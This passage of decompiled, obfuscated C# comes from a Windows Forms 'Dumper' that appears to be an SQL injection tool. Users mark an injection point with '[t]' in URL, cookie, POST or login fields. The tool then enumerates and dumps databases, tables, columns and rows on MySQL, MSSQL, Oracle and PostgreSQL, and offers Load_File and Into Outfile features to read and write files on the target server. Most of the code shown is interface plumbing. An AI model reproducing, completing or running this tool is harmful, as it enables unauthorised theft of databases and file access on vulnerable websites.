		this.mnuExtraMySQLStuffs2.Text = "User(), DataBase(), Version()";
		this.mnuLoadFile.Name = "mnuLoadFile";
		this.mnuLoadFile.Size = new System.Drawing.Size(394, 30);
		this.mnuLoadFile.Text = "Load_File()";
		this.mnuIntoOutfile.Name = "mnuIntoOutfile";
		this.mnuIntoOutfile.Size = new System.Drawing.Size(394, 30);
		this.mnuIntoOutfile.Text = "Into Outfile()";
		this.mnuIntoDumpfile.Name = "mnuIntoDumpfile";
		this.mnuIntoDumpfile.Size = new System.Drawing.Size(394, 30);
		this.mnuIntoDumpfile.Text = "Into Dumpfile()";
		this.mnuExtraMySQLStuffs.Name = "mnuExtraMySQLStuffs";
		this.mnuExtraMySQLStuffs.Size = new System.Drawing.Size(394, 30);
		this.mnuExtraMySQLStuffs.Text = "Md5(), Sha1(), Password()";
		this.mnuCheckUser.Name = "mnuCheckUser";
		this.mnuCheckUser.Size = new System.Drawing.Size(394, 30);
		this.mnuCheckUser.Text = "DataBase, Table, Column Contains %user%";
		this.mnuCheckPizza.Name = "mnuCheckPizza";
		this.mnuCheckPizza.Size = new System.Drawing.Size(394, 30);
		this.mnuCheckPizza.Text = "DataBase, Table, Column Contains Pizza";
		this.mnuJOIN.Name = "mnuJOIN";
		this.mnuJOIN.Size = new System.Drawing.Size(394, 30);
		this.mnuJOIN.Text = "JOIN Example";
		this.mnuLENGTH.Name = "mnuLENGTH";
		this.mnuLENGTH.Size = new System.Drawing.Size(394, 30);
		this.mnuLENGTH.Text = "LENGTH((DATABASE())";
		this.mnuLimitXY.Name = "mnuLimitXY";
		this.mnuLimitXY.Size = new System.Drawing.Size(394, 30);
		this.mnuLimitXY.Text = "Limit [x],[y]";
		this.ToolStripSeparator34.Name = "ToolStripSeparator34";
		this.ToolStripSeparator34.Size = new System.Drawing.Size(391, 6);
		this.mnuMySQLHelp.Name = "mnuMySQLHelp";
		this.mnuMySQLHelp.Size = new System.Drawing.Size(394, 30);
		this.mnuMySQLHelp.Text = "&Help";
		this.tlsMenu.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tlsMenu.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tlsMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.btnPasteURL, this.toolStripSeparator18, this.cmbSqlType, this.ToolStripSeparator2 });
		this.tlsMenu.Location = new System.Drawing.Point(0, 0);
		this.tlsMenu.Name = "tlsMenu";
		this.tlsMenu.Padding = new System.Windows.Forms.Padding(0, 0, 4, 0);
		this.tlsMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tlsMenu.ShowItemToolTips = false;
		this.tlsMenu.Size = new System.Drawing.Size(1762, 33);
		this.tlsMenu.Stretch = true;
		this.tlsMenu.TabIndex = 20;
		this.tlsMenu.Text = "ToolStrip2";
		this.btnPasteURL.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnPasteURL.Image = ns0.Class6.URLInputBox_16x_24;
		this.btnPasteURL.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnPasteURL.Name = "btnPasteURL";
		this.btnPasteURL.Size = new System.Drawing.Size(28, 30);
		this.btnPasteURL.Text = "&Paste URL";
		this.toolStripSeparator18.Name = "toolStripSeparator18";
		this.toolStripSeparator18.Size = new System.Drawing.Size(6, 33);
		this.cmbSqlType.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.cmbSqlType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSqlType.Name = "cmbSqlType";
		this.cmbSqlType.Size = new System.Drawing.Size(160, 33);
		this.ToolStripSeparator2.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripSeparator2.Name = "ToolStripSeparator2";
		this.ToolStripSeparator2.Size = new System.Drawing.Size(6, 33);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1762, 1452);
		base.ControlBox = false;
		base.Controls.Add(this.splData);
		base.Controls.Add(this.tsGetInfo);
		base.Controls.Add(this.tlsMenu);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "Dumper";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Dumper";
		this.tsGetInfo.ResumeLayout(false);
		this.tsGetInfo.PerformLayout();
		this.tbcMain.ResumeLayout(false);
		this.tpSchema.ResumeLayout(false);
		this.tpSchema.PerformLayout();
		this.splSchema.Panel1.ResumeLayout(false);
		this.splSchema.Panel2.ResumeLayout(false);
		this.splSchema.Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.splSchema).EndInit();
		this.splSchema.ResumeLayout(false);
		this.mnuTree.ResumeLayout(false);
		this.splWhere.Panel1.ResumeLayout(false);
		this.splWhere.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splWhere).EndInit();
		this.splWhere.ResumeLayout(false);
		this.grbWhere.ResumeLayout(false);
		this.grbWhere.PerformLayout();
		this.grbOrderBy.ResumeLayout(false);
		this.grbOrderBy.PerformLayout();
		this.tsConvert1.ResumeLayout(false);
		this.tsConvert1.PerformLayout();
		this.ctmConvert.ResumeLayout(false);
		this.ctmSchema.ResumeLayout(false);
		this.tsSchema.ResumeLayout(false);
		this.tsSchema.PerformLayout();
		this.tpQuery.ResumeLayout(false);
		this.tpQuery.PerformLayout();
		this.splQuery.Panel1.ResumeLayout(false);
		this.splQuery.Panel1.PerformLayout();
		this.splQuery.Panel2.ResumeLayout(false);
		this.splQuery.Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.splQuery).EndInit();
		this.splQuery.ResumeLayout(false);
		this.tsCustomDump.ResumeLayout(false);
		this.tsCustomDump.PerformLayout();
		this.tpMyLoadFile.ResumeLayout(false);
		this.grbWriteFile.ResumeLayout(false);
		this.grbWriteFile.PerformLayout();
		this.tsMySQLWriteFile.ResumeLayout(false);
		this.tsMySQLWriteFile.PerformLayout();
		this.grbLoadFile.ResumeLayout(false);
		this.grbLoadFile.PerformLayout();
		this.tsMySQLReadFile.ResumeLayout(false);
		this.tsMySQLReadFile.PerformLayout();
		this.tpSearch.ResumeLayout(false);
		this.tpSearch.PerformLayout();
		this.tsSearchColumn.ResumeLayout(false);
		this.tsSearchColumn.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numSleepMultiThread).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetryMultiThread).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numSleep).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetry).EndInit();
		this.pnlSetupDump.ResumeLayout(false);
		this.pnlSetupDump2.ResumeLayout(false);
		this.pnlSetupDump2.PerformLayout();
		this.tsNewDumpBtn.ResumeLayout(false);
		this.tsNewDumpBtn.PerformLayout();
		this.grbInjectionPoint.ResumeLayout(false);
		this.grbInjectionPoint.PerformLayout();
		this.grbLogin.ResumeLayout(false);
		this.grbLogin.PerformLayout();
		this.grbDumpSetup2.ResumeLayout(false);
		this.grbMySQLSplitRows.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numMySQLSplitRowsLenght).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numMySQLSplitRows).EndInit();
		this.grbDumpSetup.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numLimitX).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numMaxRetryColumn).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numFieldByField).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numLimitMax).EndInit();
		this.grbOracleCollactions.ResumeLayout(false);
		this.grbMSSQLCollactions.ResumeLayout(false);
		this.grbMySQLCollactions.ResumeLayout(false);
		this.grbSetupCon.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numThreads).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numTimeOut).EndInit();
		this.splData.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splData).EndInit();
		this.splData.ResumeLayout(false);
		this.ctmTemplatesPostgreSQL.ResumeLayout(false);
		this.ctmTemplatesOracle.ResumeLayout(false);
		this.ctmTemplatesMSSQL.ResumeLayout(false);
		this.ctmTemplatesFilters.ResumeLayout(false);
		this.ctmTemplatesMySQL.ResumeLayout(false);
		this.tlsMenu.ResumeLayout(false);
		this.tlsMenu.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void method_0(Enum5 enum5_1)
	{
		if (bool_2)
		{
			return;
		}
		bool flag = default(bool);
		switch (cmbInjectionPoint.SelectedIndex)
		{
		case 0:
			flag = txtURL.Text.IndexOf("[t]") > 0;
			break;
		case 1:
			flag = txtCookies.Text.IndexOf("[t]") >= 0;
			break;
		case 2:
			flag = txtPost.Text.IndexOf("[t]") >= 0;
			break;
		case 3:
			flag = txtUserName.Text.IndexOf("[t]") >= 0;
			break;
		case 4:
			flag = txtPassword.Text.IndexOf("[t]") >= 0;
			break;
		}
		if (!flag)
		{
			UpDateStatus(Globals.translate_0.GetStr(this, 6));
			Interaction.Beep();
			return;
		}
		enum5_0 = enum5_1;
		class44_0 = new Class44();
		class45_0 = new Class45();
		bool_3 = false;
		bool_5 = false;
		list_0 = new List<string>();
		if (Class54.smethod_9(types_0))
		{
			switch (enum5_0)
			{
			default:
				if (lblVersion.Text.StartsWith("4"))
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 7));
					Interaction.Beep();
					return;
				}
				break;
			case Enum5.const_0:
			case Enum5.const_5:
			case Enum5.const_7:
			case Enum5.const_8:
				break;
			}
		}
		if ((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5) | (enum5_0 == Enum5.const_7))
		{
			dumpGrid_0 = new DumpGrid(this);
		}
		checked
		{
			if (enum5_0 == Enum5.const_7)
			{
				if (string.IsNullOrEmpty(txtMySQLReadFilePath.Text))
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 8));
					Interaction.Beep();
					return;
				}
			}
			else if (enum5_0 == Enum5.const_8)
			{
				if (string.IsNullOrEmpty(txtMySQLWriteFile.Text))
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 9));
					Interaction.Beep();
					return;
				}
				if (string.IsNullOrEmpty(txtMySQLWriteFilePath.Text))
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 10));
					Interaction.Beep();
					return;
				}
			}
			else if (enum5_0 == Enum5.const_5)
			{
				if (Class54.smethod_9(types_0))
				{
					string string_ = txtCustomQueryFrom.Text.Trim();
					if (!string.IsNullOrEmpty(string_))
					{
						string_ = "from " + string_;
					}
					method_15(ref string_);
					class45_0.method_2("DataBase");
					class45_0.method_3("DataBase", "Table");
					class45_0.method_5("DataBase", "Table", string_);
					string[] array = txtCustomQuery.Text.Split(',');
					string[] array2 = array;
					foreach (string text in array2)
					{
						if (!string.IsNullOrEmpty(text))
						{
							class45_0.method_4("DataBase", "Table", text.Trim());
						}
					}
					bool flag2 = default(bool);
					using (Dictionary<string, Class45.Class46>.Enumerator enumerator = class45_0.dictionary_0.GetEnumerator())
					{
						while (enumerator.MoveNext() && !(flag2 = !string.IsNullOrEmpty(enumerator.Current.Value.DataBase)))
						{
						}
					}
					if (!flag2)
					{
						UpDateStatus(Globals.translate_0.GetStr(this, 11));
						Interaction.Beep();
						return;
					}
				}
				else
				{
					string string_2 = txtCustomQuery.Text.Trim();
					method_15(ref string_2);
					if (string.IsNullOrEmpty(string_2))
					{
						UpDateStatus(Globals.translate_0.GetStr(this, 12));
						Interaction.Beep();
						return;
					}
					class45_0.method_2("DataBase");
					class45_0.method_3("DataBase", "Table");
					class45_0.method_5("DataBase", "Table", string_2);
				}
			}
			else if (enum5_0 == Enum5.const_6)
			{
				if ((trwSchema.SelectedNode == null) & (enum4_0 != Enum4.const_0))
				{
					Interaction.Beep();
					return;
				}
				string text2;
				string text3;
				if (trwSchema.SelectedNode != null)
				{
					text2 = ((trwSchema.SelectedNode.Parent != null) ? method_41(trwSchema.SelectedNode.Parent.Text) : method_41(trwSchema.SelectedNode.Text));
					text3 = method_41(trwSchema.SelectedNode.Text);
				}
				else
				{
					text2 = "DataBase";
					text3 = "Table";
				}
				class45_0.method_2(text2);
				class45_0.method_3(text2, text3);
				switch (enum4_0)
				{
				case Enum4.const_1:
					class45_0.method_4(text2, text3, method_41(trwSchema.SelectedNode.Text));
					break;
				case Enum4.const_2:
					foreach (TreeNode node in trwSchema.Nodes)
					{
						class45_0.method_4(text2, text3, method_41(node.Text));
					}
					break;
				case Enum4.const_3:
					class45_0.method_4(text2, text3, method_41(trwSchema.SelectedNode.Text));
					break;
				case Enum4.const_4:
					foreach (TreeNode node2 in trwSchema.SelectedNode.Parent.Nodes)
					{
						class45_0.method_4(text2, text3, method_41(node2.Text));
					}
					break;
				case Enum4.const_5:
					class45_0.method_4(text2, text3, method_41(trwSchema.SelectedNode.Text));
					break;
				case Enum4.const_6:
					foreach (TreeNode node3 in trwSchema.SelectedNode.Parent.Nodes)
					{
						class45_0.method_4(text2, text3, method_41(node3.Text));
					}
					break;
				}
			}
			else if (enum5_0 != 0)
			{
				if (trwSchema.SelectedNode != null)
				{
					TreeNode selectedNode = trwSchema.SelectedNode;
					string[] array3 = selectedNode.FullPath.Split(Conversions.ToChar(selectedNode.TreeView.PathSeparator));
					int num = array3.Length - 1;
					for (int j = 0; j <= num; j++)
					{
						array3[j] = method_41(array3[j]);
					}
					switch (selectedNode.Level)
					{
					case 0:
						class45_0.method_2(array3[0]);
						break;
					case 1:
					case 2:
					case 3:
						class45_0.method_2(array3[0]);
						class45_0.method_3(array3[0], array3[1]);
						if (selectedNode.Level == 1)
						{
							foreach (TreeNode node4 in selectedNode.Nodes)
							{
								if (node4.Checked)
								{
									class45_0.method_4(array3[0], array3[1], node4.Text);
								}
							}
						}
						else if (selectedNode.Level == 2)
						{
							foreach (TreeNode node5 in selectedNode.Parent.Nodes)
							{
								if (node5.Checked)
								{
									class45_0.method_4(array3[0], array3[1], node5.Text);
								}
							}
						}
						else
						{
							if (selectedNode.Level != 2)
							{
								break;
							}
							foreach (TreeNode node6 in selectedNode.Parent.Parent.Nodes)
							{
								if (node6.Checked)
								{
									class45_0.method_4(array3[0], array3[1], node6.Text);
								}
							}
						}
						break;
					}
				}
				switch (enum5_1)
				{
				case Enum5.const_2:
					if (class45_0.method_1() == 0)
					{
						UpDateStatus(Globals.translate_0.GetStr(this, 13));
						Interaction.Beep();
						return;
					}
					break;
				case Enum5.const_3:
				{
					bool flag4 = default(bool);
					using (Dictionary<string, Class45.Class46>.Enumerator enumerator9 = class45_0.dictionary_0.GetEnumerator())
					{
						while (enumerator9.MoveNext() && !(flag4 = !string.IsNullOrEmpty(enumerator9.Current.Value.DataBase)))
						{
						}
					}
					if (!flag4)
					{
						UpDateStatus(Globals.translate_0.GetStr(this, 14));
						Interaction.Beep();
						return;
					}
					break;
				}
				case Enum5.const_4:
				{
					bool flag3 = default(bool);
					foreach (KeyValuePair<string, Class45.Class46> item in class45_0.dictionary_0)
					{
						if (flag3 = !string.IsNullOrEmpty(item.Value.Table) && item.Value.Columns.Count > 0)
						{
							break;
						}
					}
					if (!flag3)
					{
						UpDateStatus(Globals.translate_0.GetStr(this, 15));
						Interaction.Beep();
						return;
					}
					break;
				}
				}
			}
			else if (enum5_0 == Enum5.const_0)
			{
				method_3("", "", null);
			}
			method_2(enum5_0, bool_6: false);
			bool_2 = true;
			bckWorker.RunWorkerAsync();
		}
	}

	private void method_1(string string_9)
	{
		string text = "";
		switch (enum5_0)
		{
		case Enum5.const_1:
			text = "dataBases";
			break;
		case Enum5.const_2:
			text = "tables";
			break;
		case Enum5.const_3:
			text = "columns";
			break;
		case Enum5.const_4:
			text = "rows";
			break;
		case Enum5.const_5:
			text = "rows";
			break;
		}
		checked
		{
			if ((enum5_0 == Enum5.const_0) | (enum5_0 == Enum5.const_6))
			{
				UpDateStatus(string_9, bMain: true);
			}
			else if (enum5_0 == Enum5.const_8)
			{
				UpDateStatus(Globals.translate_0.GetStr(this, 16), bMain: true);
			}
			else if (enum5_0 == Enum5.const_7)
			{
				if (class44_0.RowsAdded == 1)
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 17), bMain: true);
				}
				else
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 18) + string_9, bMain: true);
				}
			}
			else if (enum5_0 == Enum5.const_9)
			{
				UpDateStatus(string_9, bMain: true);
			}
			else
			{
				int num = class44_0.RowsAdded;
				int num2 = ((decimal.Compare(numLimitMax.Value, 0m) <= 0) ? class44_0.AffectedRows : Convert.ToInt32(numLimitMax.Value));
				if (method_10())
				{
					num2 *= int_1;
					num *= int_1;
				}
				string text2 = "";
				bool flag = Class54.smethod_11(types_0);
				if (((num2 != 32767) & !(flag & (enum5_0 == Enum5.const_1))) && num < num2)
				{
					text2 = " / " + Conversions.ToString(num2) + ", " + Globals.translate_0.GetStr(this, 19) + " " + Conversions.ToString(num2 - num) + " " + text;
				}
				UpDateStatus(string_9 + ", " + text + " " + Globals.translate_0.GetStr(this, 20) + " " + Conversions.ToString(num) + text2, bMain: true);
			}
			if ((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5))
			{
				dumpGrid_0 = null;
			}
			bool_2 = false;
			method_2(enum5_0, bool_6: true);
			class44_0 = null;
			class45_0 = null;
		}
	}

	internal void method_2(Enum5 enum5_1, bool bool_6)
	{
		if (Boolean_0)
		{
			return;
		}
		bool flag = !bool_6 && chkClearListOnGet.Checked;
		btnPasteURL.Enabled = bool_6;
		txtURL.SelectionStart = 0;
		txtURL.SelectionLength = 1;
		txtURL.Enabled = bool_6;
		cmbMethod.Enabled = bool_6;
		cmbSqlType.Enabled = bool_6;
		btnLoadDefautSettings.Enabled = bool_6;
		btnServerInfo.Enabled = bool_6;
		btnDataBases.Enabled = bool_6;
		btnTables.Enabled = bool_6;
		btnColumns.Enabled = bool_6;
		btnDumpData.Enabled = bool_6;
		btnDumpCustom.Enabled = bool_6;
		grbMSSQLCollactions.Enabled = bool_6;
		grbMySQLCollactions.Enabled = bool_6;
		grbOracleCollactions.Enabled = bool_6;
		grbMySQLSplitRows.Enabled = bool_6;
		grbLogin.Enabled = bool_6;
		chkThreads.Enabled = bool_6;
		numThreads.Enabled = bool_6;
		numThreads.Enabled = bool_6;
		numLimitX.Enabled = bool_6;
		cmbInjectionPoint.Enabled = bool_6;
		chkDumpFieldByField.Enabled = bool_6;
		numFieldByField.Enabled = bool_6;
		chkDumpEncodedHex.Enabled = bool_6;
		chkDumpWhere.Enabled = bool_6;
		chkDumpOrderBy.Enabled = bool_6;
		chkAllInOneRequest.Enabled = bool_6;
		chkDumpIFNULL.Enabled = bool_6;
		grbInjectionPoint.Enabled = bool_6;
		if (bool_6)
		{
			numLimitMax.Value = 0m;
			numFieldByField.Enabled = chkDumpFieldByField.Checked;
		}
		numLimitMax.Enabled = bool_6;
		btnMySQLReadFile.Enabled = bool_6;
		btnMySQLWriteFile.Enabled = bool_6;
		switch (enum5_1)
		{
		case Enum5.const_0:
			if (flag)
			{
				string_0 = "";
				lblCountBDs.Text = "-1";
				trwSchema.Nodes.Clear();
				method_32();
				txtSearchColumnResult.Clear();
				bool flag2;
				if ((flag2 = true) == txtURL.Text.IndexOf("[t]") > 0)
				{
					cmbInjectionPoint.SelectedIndex = 0;
				}
				else if (flag2 == txtCookies.Text.IndexOf("[t]") >= 0)
				{
					cmbInjectionPoint.SelectedIndex = 1;
				}
				else if (flag2 == txtPost.Text.IndexOf("[t]") >= 0)
				{
					cmbInjectionPoint.SelectedIndex = 2;
				}
				else if (flag2 == txtUserName.Text.IndexOf("[t]") >= 0)
				{
					cmbInjectionPoint.SelectedIndex = 3;
				}
				else if (flag2 == txtPassword.Text.IndexOf("[t]") >= 0)
				{
					cmbInjectionPoint.SelectedIndex = 4;
				}
			}
			chkDumpWhere.Checked = false;
			chkDumpOrderBy.Checked = false;
			numLimitX.Value = numLimitX.Minimum;
			break;
		case Enum5.const_1:
			if (flag)
			{
				trwSchema.Nodes.Clear();
			}
			break;
		case Enum5.const_2:
			if (flag)
			{
				TreeNode selectedNode = trwSchema.SelectedNode;
				if (selectedNode.Level == 0)
				{
					selectedNode.Nodes.Clear();
				}
			}
			if (bool_6 && trwSchema.Nodes.ContainsKey(class45_0.method_0(0).DataBase))
			{
				trwSchema.Nodes[class45_0.method_0(0).DataBase].EnsureVisible();
			}
			break;
		case Enum5.const_3:
			if (flag)
			{
				TreeNode selectedNode2 = trwSchema.SelectedNode;
				if (selectedNode2.Level == 1)
				{
					selectedNode2.Nodes.Clear();
				}
				else if (selectedNode2.Level == 2)
				{
					selectedNode2.Parent.Nodes.Clear();
				}
				else if (selectedNode2.Level == 3)
				{
					selectedNode2.Parent.Parent.Nodes.Clear();
				}
			}
			if (bool_6 && trwSchema.Nodes.ContainsKey(class45_0.method_0(0).Table))
			{
				trwSchema.Nodes[class45_0.method_0(0).Table].EnsureVisible();
			}
			break;
		case Enum5.const_6:
			if (enum4_0 == Enum4.const_0 && !bool_6)
			{
				lblCountBDs.Text = "-1";
			}
			break;
		case Enum5.const_7:
		case Enum5.const_8:
			txtMySQLReadFilePath.ReadOnly = !bool_6;
			txtMySQLWriteFile.ReadOnly = !bool_6;
			txtMySQLWriteFilePath.ReadOnly = !bool_6;
			cmbMySQLWriteFilePath.Enabled = bool_6;
			break;
		case Enum5.const_9:
			tsSearchColumn.Enabled = bool_6;
			if (!bool_6)
			{
				txtSearchColumnResult.Clear();
			}
			break;
		}
		if (!bool_6)
		{
			dumpLoading_0 = new DumpLoading(this);
			dumpLoading_0.grbBack.Text = string_4;
			splData.Panel1.Controls.Add(dumpLoading_0.grbBack);
			dumpLoading_0.Dock = DockStyle.Bottom;
			dumpLoading_0.BringToFront();
			Globals.AddMouseMoveForm(dumpLoading_0);
			dumpLoading_0.tstMain.AutoSize = false;
			dumpLoading_0.OnPause += [SpecialName] [DebuggerHidden] (bool bool_6) =>
			{
				method_6(bool_6);
			};
			dumpLoading_0.OnCancel += LoadingOnCancel;
			UpDateStatus(string_4);
		}
		else
		{
			splData.Panel1.Controls.Remove(dumpLoading_0.grbBack);
			dumpLoading_0.Dispose();
			method_56(null, null);
			method_99(null, null);
		}
		Globals.G_Taskbar.SetProgressValue(0, 100);
		if (bool_6)
		{
			Globals.G_Taskbar.SetProgressState(ProgressBarState.NoProgress);
		}
		else
		{
			Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
		}
	}

	internal void method_3(string string_9, string string_10, Image image_0)
	{
		if (tsGetInfo.InvokeRequired)
		{
			tsGetInfo.Invoke(new Delegate25(method_3), string_9, string_10, image_0);
			return;
		}
		string_9 = string_9.Trim();
		lblVersion.Text = string_9;
		lblCountry.Text = string_10;
		lblCountry.Image = image_0;
		if (string_9.StartsWith("4"))
		{
			lblVersion.ForeColor = Color.Red;
		}
		else if (!string.IsNullOrEmpty(string_9))
		{
			lblVersion.ForeColor = Color.Blue;
		}
		else
		{
			lblVersion.ForeColor = ForeColor;
		}
	}

	public void UpDateStatus(string sDesc, bool bMain = false)
	{
		if ((dumpLoading_0 == null || bMain) | Globals.IS_DUMP_INSTANCE | !Globals.GMain.Boolean_1)
		{
			Globals.GMain.method_1(sDesc);
		}
		else
		{
			dumpLoading_0.method_2(sDesc);
		}
	}

	internal void method_4(string string_9)
	{
		if (base.InvokeRequired)
		{
			Invoke(new Delegate20(method_4), string_9);
			return;
		}
		dumpLoading_0.method_1(ProgressBarStyle.Blocks);
		bool flag = default(bool);
		dumpLoading_0.method_0(Conversions.ToInteger(string_9), ref flag);
		if (flag)
		{
			bckWorker.CancelAsync();
		}
	}

	private void method_5(int int_3)
	{
		if (_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init, ref lockTaken);
			if (_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init.State == 0)
			{
				_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init.State = 2;
				_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay = DateAndTime.Now.AddHours(-1.0);
			}
			else if (_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay_0024Init);
			}
		}
		while (!(DateAndTime.Now.Subtract(_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay).TotalMilliseconds > (double)int_3))
		{
			Thread.Sleep(100);
		}
		_0024STATIC_0024CheckRequestDelay_002420118_0024LastRequestDelay = DateAndTime.Now;
	}

	private object method_6(object object_0)
	{
		if (base.InvokeRequired)
		{
			return Invoke(new Globals.DGetObjectValue(method_6), object_0);
		}
		numLimitMax.Enabled = Conversions.ToBoolean(object_0);
		return null;
	}

	public void LoadingOnCancel()
	{
		if (bool_2)
		{
			bckWorker.CancelAsync();
		}
	}

	private object method_7(object object_0)
	{
		if (base.InvokeRequired)
		{
			return Invoke(new Globals.DGetObjectValue(method_7), object_0);
		}
		bool flag;
		if ((flag = true) == object_0 is ComboBox)
		{
			if (object_0 == cmbMSSQLCast)
			{
				return ((ComboBox)object_0).Text.Trim();
			}
			return ((ComboBox)object_0).SelectedIndex;
		}
		if (flag == object_0 is TextBox)
		{
			return ((TextBox)object_0).Text;
		}
		if (flag == object_0 is CheckBox)
		{
			return ((CheckBox)object_0).Checked;
		}
		if (flag == object_0 is RadioButton)
		{
			return ((RadioButton)object_0).Checked;
		}
		if (flag == object_0 is ToolStripButton)
		{
			return ((ToolStripButton)object_0).Checked;
		}
		if (flag == object_0 is ToolStripLabel)
		{
			return ((ToolStripLabel)object_0).Text;
		}
		if (flag == object_0 is NumericUpDown)
		{
			return ((NumericUpDown)object_0).Value;
		}
		if (flag == object_0 is TrackBar)
		{
			return ((TrackBar)object_0).Value;
		}
		if (flag == object_0 is TreeViewExt)
		{
			return ((TreeViewExt)object_0).Handle;
		}
		if (flag == object_0 is ToolStripSpringTextBox)
		{
			return ((ToolStripSpringTextBox)object_0).Text;
		}
		if (flag == object_0 is ToolStripMenuItem)
		{
			return ((ToolStripMenuItem)object_0).Text;
		}
		if (flag == object_0 is ToolStripTextBox)
		{
			return ((ToolStripTextBox)object_0).Text;
		}
		if (flag == object_0 is ToolStripComboBox)
		{
			return ((ToolStripComboBox)object_0).SelectedIndex;
		}
		throw new Exception("Bad Changed GetObjectValue");
	}

	private void method_8(object object_0, object object_1)
	{
		if (base.InvokeRequired)
		{
			Invoke(new Globals.DSetObjectValue(method_8), object_0, object_1);
			return;
		}
		bool flag;
		if ((flag = true) == object_0 is ComboBox)
		{
			if (Versioned.IsNumeric(RuntimeHelpers.GetObjectValue(object_1)))
			{
				((ComboBox)object_0).SelectedIndex = Conversions.ToInteger(object_1);
			}
			else
			{
				((ComboBox)object_0).Text = Conversions.ToString(object_1);
			}
			return;
		}
		if (flag == object_0 is TextBox)
		{
			((TextBox)object_0).Text = Conversions.ToString(object_1);
			return;
		}
		if (flag == object_0 is CheckBox)
		{
			((CheckBox)object_0).Checked = Conversions.ToBoolean(object_1);
			return;
		}
		if (flag == object_0 is RadioButton)
		{
			((RadioButton)object_0).Checked = Conversions.ToBoolean(object_1);
			return;
		}
		if (flag == object_0 is ToolStripButton)
		{
			((ToolStripButton)object_0).Checked = Conversions.ToBoolean(object_1);
			return;
		}
		if (flag == object_0 is ToolStripLabel)
		{
			((ToolStripLabel)object_0).Text = Conversions.ToString(object_1);
			return;
		}
		if (flag == object_0 is NumericUpDown)
		{
			((NumericUpDown)object_0).Value = Conversions.ToDecimal(object_1);
			return;
		}
		if (flag == object_0 is TrackBar)
		{
			((TrackBar)object_0).Value = Conversions.ToInteger(object_1);
			return;
		}
		throw new Exception("Bad Changed SetObjectValue");
	}

	private void method_9()
	{
		string_5 = string_1;
		string_6 = "";
		int_1 = 0;
		checked
		{
			int num = string_1.Length - 4;
			for (int i = 0; i <= num; i++)
			{
				string text = string_1.Substring(i, 3);
				if (!text.Equals("[t]"))
				{
					continue;
				}
				if (int_1 > 0)
				{
					text = string_5;
					text = text.Remove(i, 3);
					text = text.Insert(i, "_|_");
					if (string.IsNullOrEmpty(string_6))
					{
						string_6 = text;
						string_6 = string_6.Replace("[t]", "0");
						string_6 = string_6.Replace("_|_", "[t]");
					}
					text = text.Replace("_|_", "[t" + Conversions.ToString(int_1));
					string_5 = text;
				}
				int_1++;
			}
			if (string.IsNullOrEmpty(string_6))
			{
				string_6 = string_1;
			}
		}
	}

	private bool method_10()
	{
		if (((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5)) && ((types_0 == Types.MySQL_No_Error) | (types_0 == Types.MSSQL_No_Error) | (types_0 == Types.Oracle_No_Error) | (types_0 == Types.PostgreSQL_No_Error)))
		{
			return Conversions.ToBoolean(Conversions.ToBoolean(Operators.NotObject(method_7(chkDumpFieldByField))) && int_1 > 1);
		}
		bool result = default(bool);
		return result;
	}

	private void method_11(object sender, DoWorkEventArgs e)
	{
		string string_ = "";
		try
		{
			appDomainControl_0 = new AppDomainControl();
			int_2 = -1;
